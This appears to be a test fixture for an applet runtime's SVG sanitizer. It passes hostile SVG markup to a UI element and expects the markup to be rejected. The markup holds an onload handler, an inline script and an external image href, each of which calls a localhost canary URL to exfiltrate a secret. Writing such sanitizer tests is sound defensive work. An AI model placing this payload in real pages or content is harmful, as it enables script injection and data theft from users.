// Hostile applet: feed the ui-svg element markup that tries to exfiltrate/script —
// inline <script>, an onload handler, and an external <image href>. The host SVG
// sanitizer must reject the document (render a fallback), so nothing reaches the
// canary and no script runs.
import React from 'react';
import {runApplet} from '../../../src/applet/runtime';
import {Svg} from '../../../src/applet/remote-elements';

const CANARY = 'http://localhost:4399/svg-exfil?d=SECRET';
const EVIL = `<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('${CANARY}')">
  <script>fetch('${CANARY}')</script>
  <image href="${CANARY}" />
  <rect width="10" height="10" fill="red"/>
</svg>`;

function App() {
  return React.createElement(Svg, {markup: EVIL, ariaLabel: 'hostile'});
}

runApplet(App as unknown as React.ComponentType<never>, {
  appletId: 'hostile.svg-exfil',
  appletVersion: '0',
});
